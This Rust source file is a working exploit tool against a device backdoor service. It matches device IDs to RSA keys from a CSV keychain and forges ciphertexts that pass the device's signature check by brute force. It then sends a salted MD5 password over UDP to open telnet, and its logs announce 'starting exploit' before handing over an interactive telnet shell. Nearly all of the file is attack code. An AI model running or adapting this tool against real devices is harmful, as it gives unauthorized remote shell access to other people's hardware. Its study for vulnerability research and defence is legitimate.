use openssl::bn::BigNum;
use openssl::rsa::{Padding, Rsa};
use openssl::pkey::{Public};
use openssl::error::ErrorStack;
use openssl::hash::{hash, MessageDigest};
use rand::prelude::*;
use std::net::{UdpSocket, TcpStream};
use csv;
use std::collections::HashMap;
use clap::Parser;
use log::{info, trace, warn, error, debug};
use env_logger;
use std::thread::sleep;
use telnet::Telnet;
use std::time::{Duration};
use std::process::{Command,Stdio};



const ANSI_RESET: &str = "\x1b[0m";
const ANSI_GRAY: &str = "\x1b[90m";
const ANSI_RED: &str = "\x1b[91m";
const ANSI_GREEN: &str = "\x1b[92m";
const ANSI_YELLOW: &str = "\x1b[93m";
const ANSI_BLUE: &str = "\x1b[94m";
const ANSI_MAGENTA: &str = "\x1b[95m";
const ANSI_CYAN: &str = "\x1b[96m";
const ANSI_WHITE: &str = "\x1b[97m";



#[derive(Parser,Debug,Eq,PartialEq)]
enum Protocol {
    Protocol1,
    Protocol2,
    Protocol3
}


#[derive(Parser,Debug)]
struct Cli {
    #[clap(short, long)]
    protocol: u8,
    #[clap(short, long)]
    address: String,
    // The port should be an optional arg, default 21210
    #[clap(short, long)]
    backdoor_port: Option<u16>,
    #[clap(short, long)]
    telnet_port: Option<u16>,
    #[clap(short, long)]
    keychain_path: String,
    #[clap(short, long)]
    salt: Option<String>,
}


#[derive(Debug)]
struct Context {
    protocol: Protocol,
    address: String,
    port: u16,
    telnet_port: u16,
    e: Option<String>,
    n: Option<String>,
    d: Option<String>,
    knockknock: Option<String>,
    salt: String,
    keychain: HashMap<String, String>,
    stage: u8,
    iteration: u32,
}


fn read_keychain_from_csv(path: &str) -> HashMap<String, String> {
    let mut reader = csv::Reader::from_path(path).unwrap();
    let mut keychain = HashMap::new();
    for result in reader.records() {
        let record = result.unwrap();
        // trim the whitespace from these fields
        keychain.insert(record[0].trim().to_string(), record[1].trim().to_string());
    }
    keychain
}


fn init_context(cli: &Cli) -> Context {
    let keychain = read_keychain_from_csv(&cli.keychain_path);
    info!("Keychain loaded from {}", &cli.keychain_path);
    for (key, value) in keychain.iter() {
        trace!("{} -> {}", key, value);
    }
    let protocol = match cli.protocol {
        1 => Protocol::Protocol1,
        2 => Protocol::Protocol2,
        3 => Protocol::Protocol3,
        _ => panic!("Protocol must be 1, 2 or 3"),
    };
    let knockknock = match protocol {
        Protocol::Protocol1 => None,
        Protocol::Protocol2 => None,
        Protocol::Protocol3 => Some("ABCDEF1234".to_string()),
    };
    Context {
        protocol: protocol,
        address: cli.address.clone(),
        port: cli.backdoor_port.unwrap_or(21210),
        telnet_port: cli.telnet_port.unwrap_or(23),
        e: None,
        n: None,
        d: None,
        knockknock: knockknock,
        salt: cli.salt.clone().unwrap_or("TEMP".to_string()),
        keychain: keychain,
        stage: 0,
        iteration: 0,
    }
}




fn hexdump(data: &[u8]) -> String {
    let s = data.iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" ");
    format!("{}{}{}", ANSI_GRAY, s, ANSI_RESET)
}


fn _hexdump2(data: &[u8]) -> String {
    // print data in the same format as `hexdump -C`,
    // with ascii characters in the left margin
    let mut s = String::new();
    s.push_str(ANSI_GRAY);
    for (i, chunk) in data.chunks(16).enumerate() {
        s.push_str(&format!("{:04x}  ", i * 16));
        for (j, byte) in chunk.iter().enumerate() {
            s.push_str(&format!("{:02x} ", byte));
            if j == 7 {
                s.push_str(" ");
            }
        }
        if chunk.len() < 16 {
            for _ in 0..(16 - chunk.len()) {
                s.push_str("   ");
            }
        }
        s.push_str("|");
        for byte in chunk {
            if *byte >= 0x20 && *byte <= 0x7e {
                s.push(*byte as char);
            } else {
                s.push_str(".");
            }
        }
        s.push_str("|");
    }
    s.push_str(ANSI_RESET);
    println!("{}", s);
    return s
}


fn md5(data: &[u8]) -> Vec<u8> {
    hash(MessageDigest::md5(), data).unwrap().to_vec()
}


fn mkrsa(e: &str, n: &str) -> Result<Rsa<Public>, ErrorStack> {
    let e = BigNum::from_hex_str(e)?;
    let n = BigNum::from_hex_str(n)?;
    return Rsa::from_public_components(n, e)
}


fn random_bytes(buf: &mut [u8]) {
    let len = buf.len();
    let mut rng = thread_rng();
    for i in 0..len {
        buf[i] = rng.gen();
    }
}


fn find_phony_ciphertext(
    rsa: &Rsa<Public>,
    predicate: &dyn Fn(&[u8]) -> bool) -> Vec<u8> {
    trace!("Searching for phony ciphertext with desired property...");
    let mut ciphertext = vec![0; 0x80];
    let mut plaintext = vec![0; 0x80];
    let mut tries = 0;
    
    loop {
        tries += 1;
        random_bytes(&mut ciphertext);
        match rsa.public_decrypt(&ciphertext, &mut plaintext, Padding::NONE) {
            Ok(_) => {
                if predicate(&plaintext) {
                    trace!("Found phony ciphertext after {} tries", tries);
                    return ciphertext;
                }
            },
            Err(_) => {}
        }
    }
}


fn communicate(addr: &str, port: u16, data: &[u8], await_reply: bool) -> std::io::Result<Vec<u8>> {
    let socket;
    let mut p = port;
    loop {
        p += 1;
        if p > 65534 {
            panic!("No free port found");
        }
        match UdpSocket::bind(("0.0.0.0", p)) {
            Ok(s) => {
                trace!("Bound to 0.0.0.0:{}", p);
                socket = s;
                break;
            },
            Err(_) => {}
        }
    }
    trace!("Sending {} bytes to {}:{}", data.len(), addr, port);

    socket.connect((addr, port))?;
    socket.send(data)?;

    let mut buf = vec![0; 0x100];
    if await_reply {
        // wait a tiny bit
        sleep(Duration::from_millis(10));
        // set a timeout of 1 second
        socket.set_read_timeout(Some(Duration::new(1, 0)))?;
        let len = socket.recv(&mut buf)?;
        buf.truncate(len);
        return Ok(buf); 
    } else {
        return Ok(vec![]);
    }
}


fn device_identifying_hash(idstr: &str) -> Vec<u8> {
    let mut data = vec![0; 0x80];
    data[0..idstr.len()].copy_from_slice(idstr.as_bytes());
    md5(&data)
}


fn probe_tcp_port(addr: &str, port: u16) -> bool {
    trace!("Checking TCP port {}:{}", addr, port);
    TcpStream::connect((addr, port)).is_ok()
}


fn stage1(ctx: &mut Context) -> std::io::Result<u8> {
    trace!("Entering Stage 1");
    assert!(ctx.stage == 1 && ctx.protocol == Protocol::Protocol3);
    let data = ctx.knockknock.as_ref().unwrap().as_bytes();
    let id = communicate(&ctx.address, ctx.port, &data, true)?;

    // now iterate through the keychain and find a match
    for (idstr, pubkey) in ctx.keychain.iter() {
        let hash = device_identifying_hash(idstr);
        if hash == id {
            info!("Found key for device: {} -> {}", idstr, pubkey);
            ctx.e = Some("10001".to_string());
            ctx.n = Some(pubkey.to_string());
            return Ok(2);
        }
    }

    Err(std::io::Error::new(std::io::ErrorKind::Other, "No match found"))
}


fn stage2(ctx: &Context) -> std::io::Result<u8> {
    trace!("Entering Stage 2");
    assert!(ctx.stage == 2);
    if ctx.e.is_none() || ctx.n.is_none() {
        panic!("No public key available");
    }
    
    let rsa = mkrsa(ctx.e.as_ref().unwrap(), ctx.n.as_ref().unwrap()).expect("Failed to build RSA keys.");
    trace!("Built RSA keys");
    // use for protocols 2 and 3
    fn first_byte_printable(data: &[u8]) -> bool {
        return data[0] >= 0x20 && data[0] < 0x7f;
    }
    // use for protocol 1
    fn first_byte_null(data: &[u8]) -> bool {
        return data[0] == 0;
    }

    let predicate = match ctx.protocol {
        Protocol::Protocol1 => first_byte_null,
        Protocol::Protocol2 => first_byte_printable,
        Protocol::Protocol3 => first_byte_printable
    };

    let ciphertext = find_phony_ciphertext(&rsa, &predicate);
    trace!("Found phony ciphertext: {}", hexdump(&ciphertext));

    if ctx.protocol == Protocol::Protocol1 {
        communicate(&ctx.address, ctx.port, &ciphertext, false)?;
        return Ok(3);
    } 
    
    let challenge = communicate(&ctx.address, ctx.port, &ciphertext, true)?;
    if challenge.len() != 0x80 {
        warn!("Unexpected challenge length: {}", challenge.len());
        match ctx.protocol {
            Protocol::Protocol2 => return Ok(2),
            Protocol::Protocol3 => return Ok(1),
            _ => panic!("Should be unreachable, this is a bug!"),
        }
    }
    trace!("Received challenge: {}", hexdump(&challenge));
    Ok(3) // go to stage 3
}


fn stage3(ctx: &Context) -> std::io::Result<u8> {
    trace!("Entering Stage 3");
    assert!(ctx.stage == 3);
    let password = md5(format!("+{}", ctx.salt).as_bytes());
    trace!("Password prepared: {}", hexdump(&password));
    let _res = communicate(&ctx.address, ctx.port, &password, false)?;
    sleep(Duration::from_millis(100));
    if probe_tcp_port(&ctx.address, ctx.telnet_port) {
        Ok(4)
    } else {
        match ctx.protocol {
            Protocol::Protocol1 => Ok(2),
            Protocol::Protocol2 => Ok(2),
            Protocol::Protocol3 => Ok(1)
        }
    }
}


fn _telnet(ctx: &Context) -> std::io::Result<()> {
    let mut tel = Telnet::connect((ctx.address.as_str(), ctx.telnet_port), 256)?;
    info!("Telnet connection established with {}:{}", ctx.address, ctx.telnet_port);
    tel.write(b"Hello, world!\r\n")?;


    Ok(())
}


fn telnet(ctx: &Context) -> std::io::Result<()> {
    let res = Command::new("telnet")
        .arg(ctx.address.as_str())
        .arg(ctx.telnet_port.to_string())
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .output()?;
    trace!("telnet process terminated: {:?}", res);

    Ok(())
}


fn stage_colour(stage: u8) -> &'static str{
    match stage {
        1 => ANSI_GREEN,
        2 => ANSI_YELLOW,
        3 => ANSI_RED,
        4 => ANSI_CYAN,
        _ => panic!("Invalid stage: {}", stage)
    }
}

fn state_machine(ctx: &mut Context) -> std::io::Result<()> {
    ctx.stage = match ctx.protocol {
        Protocol::Protocol1 => 2,
        Protocol::Protocol2 => 2,
        Protocol::Protocol3 => 1
    };

    match ctx.protocol {
        Protocol::Protocol1 => {
            ctx.n = Some(ctx.keychain.get("p1default").expect("No default key provided for Protocol 1").clone());
            ctx.e = Some("10001".to_string());
        }
        Protocol::Protocol2 => {
            ctx.n = Some(ctx.keychain.get("p2default").expect("No default key provided for Protocol 2").clone());
            ctx.e = Some("10001".to_string());
        }
        Protocol::Protocol3 => {
            ctx.n = None;
            ctx.e = None;
        }
    }


    loop {
        ctx.iteration += 1;
        info!("{}Iteration {} - Stage {}{}", stage_colour(ctx.stage), ctx.iteration, ctx.stage, ANSI_RESET);
        match ctx.stage {
            1 => {
                ctx.stage = stage1(ctx)?;
            },
            2 => {
                ctx.stage = stage2(ctx)?;
            },
            3 => {
                ctx.stage = stage3(ctx)?;
            },
            4 => {
                // Run telnet!
                telnet(ctx)?;
                break;
            },
            _ => {
                panic!("Invalid stage: {}", ctx.stage);
            }
        }
    }
    Ok(())
}


fn main() {

    env_logger::init();
    trace!("Entering main");

    let cli = Cli::parse();
    let mut ctx = init_context(&cli);

    if probe_tcp_port(&ctx.address, ctx.telnet_port) {
        warn!("Backdoor already open!");
        sleep(Duration::from_millis(100));
    
        telnet(&ctx).unwrap();
        return;
    }
    info!("Backdoor closed, starting exploit");

    loop {
        sleep(Duration::from_millis(100));
        match state_machine(&mut ctx) {
            Ok(_) => {
                info!("Finished.");
                return;
            }
            Err(e) => {
                warn!("Error: {}", e);
                sleep(Duration::from_millis(100));
                warn!("Restarting state machine...");
            }
        }
    }

}
